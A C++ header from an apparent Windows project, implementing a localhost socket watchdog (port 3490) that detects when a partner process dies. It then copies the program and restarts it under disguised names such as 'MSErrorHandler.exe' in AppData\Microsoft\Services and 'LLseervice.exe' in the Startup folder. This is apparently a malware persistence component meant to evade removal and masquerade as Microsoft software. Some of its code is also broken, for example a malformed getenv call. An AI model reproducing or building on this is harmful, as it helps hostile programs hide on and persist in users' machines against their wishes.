//
//  sockstatus.h
//  testSocket
//
//  Created by Tanuphat on 5/21/2560 BE.
//
//

#ifndef sockstatus_h
#define sockstatus_h

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
//#include <netdb.h>
#include <sys/types.h>
//#include <netinet/in.h>
//#include <winsock.h>
//#include <sys/wait.h>
#include <signal.h>
#include <time.h>
//#include <arpa/inet.h>
#define _WIN32_WINNT 0x501
#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>


#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")



namespace ss
{
    #define DEFAULT_PORT "3490"  // the port users will be connecting to
    #define ip "127.0.0.1"
    #define DEFAULT_BUFLEN 512

    int connect()
    {   WSADATA wsaData;
        SOCKET ConnectSocket = INVALID_SOCKET;
        struct addrinfo *result = NULL,
                *ptr = NULL,
                socclinet;

        char *sendbuf = "arekor";

        char recvbuf[DEFAULT_BUFLEN];
        int iResult;
        int recvbuflen = DEFAULT_BUFLEN;


        // Initialize Winsock
        iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
        if (iResult != 0) {
            //WSAStartup failed with error
            return 1;
        }

        ZeroMemory( &socclinet, sizeof(socclinet) );
        socclinet.ai_family = AF_UNSPEC;
        socclinet.ai_socktype = SOCK_STREAM;
        socclinet.ai_protocol = IPPROTO_TCP;

        // Resolve the server address and port
        iResult = getaddrinfo(ip, DEFAULT_PORT, &socclinet, &result);
        if ( iResult != 0 ) {
            //getaddrinfo failed with error:
            WSACleanup();
            return 1;
        }

        // Attempt to connect to an address 5 time
        for(int i = 0;i<6;i++ ) {

            // Create a SOCKET for connecting to server
            ConnectSocket = socket(result->ai_family, result->ai_socktype,
                                   result->ai_protocol);
            if (ConnectSocket == INVALID_SOCKET) {
                //socket failed with error:
                WSACleanup();
                return 1;
            }

            // Connect to server.
            iResult = connect( ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
            if (iResult == SOCKET_ERROR) {
                //socket connect error
                closesocket(ConnectSocket);
                ConnectSocket = INVALID_SOCKET;
                if (i == 5){
                    return 3;
                }
            }

        }

        freeaddrinfo(result);

        if (ConnectSocket == INVALID_SOCKET) {
            //Unable to connect to server!
            WSACleanup();
            return 3;
        }
        while (true) {
            // Send an initial buffer
            iResult = send(ConnectSocket, sendbuf, (int) strlen(sendbuf), 0);
            if (iResult == SOCKET_ERROR) {
                //send failed with error:
                closesocket(ConnectSocket);
                WSACleanup();
                return 2;
            }

            //Bytes Sent: iResult

            // shutdown the connection since no more data will be sent
            iResult = shutdown(ConnectSocket, SD_SEND);
            if (iResult == SOCKET_ERROR) {
                //shutdown failed with error
                closesocket(ConnectSocket);
                WSACleanup();
                return 1;
            }

            // Receive until the peer closes the connection
            do {

                iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
                if (iResult > 0)continue;
                    //Bytes received:
                else if (iResult == 0)return 3;
                    //Connection closed
                else return 2;
                //recv failed with error:

            } while (iResult > 0);
        }
        // cleanup
        //closesocket(ConnectSocket);
        //WSACleanup();

       // return 0;

    }
    int server()
    {   WSADATA wsaData;
        int iResult;

        SOCKET ListenSocket = INVALID_SOCKET;
        SOCKET ClientSocket = INVALID_SOCKET;

        struct addrinfo *result = NULL;
        struct addrinfo sock;

        int iSendResult;
        char recvbuf[DEFAULT_BUFLEN];
        int recvbuflen = DEFAULT_BUFLEN;

        // Initialize Winsock
        iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
        if (iResult != 0) {
            //WSAStartup failed with error
            return 1;
        }

        ZeroMemory(&sock, sizeof(sock));
        sock.ai_family = AF_INET;
        sock.ai_socktype = SOCK_STREAM;
        sock.ai_protocol = IPPROTO_TCP;
        sock.ai_flags = AI_PASSIVE;

        // Resolve the server address and port
        iResult = getaddrinfo(NULL, DEFAULT_PORT, &sock, &result);
        if ( iResult != 0 ) {
            //getaddrinfo failed with error
            WSACleanup();
            return 1;
        }

        // Create a SOCKET for connecting to server
        ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (ListenSocket == INVALID_SOCKET) {
            //socket failed with error:
            freeaddrinfo(result);
            WSACleanup();
            return 1;
        }

        // Setup the TCP listening socket
        iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            //bind failed with error
            freeaddrinfo(result);
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        freeaddrinfo(result);

        iResult = listen(ListenSocket, SOMAXCONN);
        if (iResult == SOCKET_ERROR) {
            //listen failed with error
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }

        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET) {
            //accept failed with error
            closesocket(ListenSocket);
            WSACleanup();
            return 1;
        }



        // Receive until the peer shuts down the connection
        do {

            iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
            if (iResult > 0) {
                //Bytes received:

                // Echo the buffer back to the sender
                iSendResult = send( ClientSocket, recvbuf, iResult, 0 );
                if (iSendResult == SOCKET_ERROR) {
                    //send failed with error
                    closesocket(ClientSocket);
                    WSACleanup();
                    return 2;
                }

            }
            else if (iResult == 0)
            {   //Connection closing...
                std::this_thread::sleep_for(std::chrono::milliseconds(5000000));
                iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
                if (iResult == 0)return 3;
            }
            else  {
                printf("recv failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
                WSACleanup();
                return 2;
            }

        } while (true);


    }

    void creckSoc(){
        int server = ss::server();
        if (server == 1) {
            while (true) {
                int con = ss::connect();
                if (con == 3) {
                    //try 3 time
                    for (int i = 0; i < 3; ++i) {
                        con = ss::connect();
                        if (con == 3) {
                            //true file not delete
                            break;
                        } else {
                            if (i == 2) {
                                std::string filename = IO::getFileName();
                                if (filename == "MSErrorHandler.exe"){
                                    std::string appdata_dir(getenv("*APPDATA*"));
                                    std::string path = appdata_dir + "\\Microsoft\\Services\\";
                                    filename = path+"MSErrorHandler.exe";
                                } else{
                                    filename = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
                                }
                                if (IO::exists_file(filename)){
                                    IO::startup(filename.c_str());
                                } else{
                                    if (!IO::copy_File()) break;
                                }

                            }
                        }
                    }
                } else {
                    continue;
                }
            }
        } else {
            if (server == 3) {
                std::string filename = IO::getFileName();
                if (filename == "MSErrorHandler.exe"){
                    std::string appdata_dir(getenv("*APPDATA*"));
                    std::string path = appdata_dir + "\\Microsoft\\Services\\";
                    filename = path+"MSErrorHandler.exe";
                } else{
                    filename = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\LLseervice.exe";
                }
                if (IO::exists_file(filename)){
                    IO::startup(filename.c_str());
                } else{
                    if (IO::copy_File()) {
                        //continue
                    } else {
                        //cannot backup i will die
                        creckSoc();
                    }
                }
            }
        }
    }
}

#endif /* sockstatus_h */
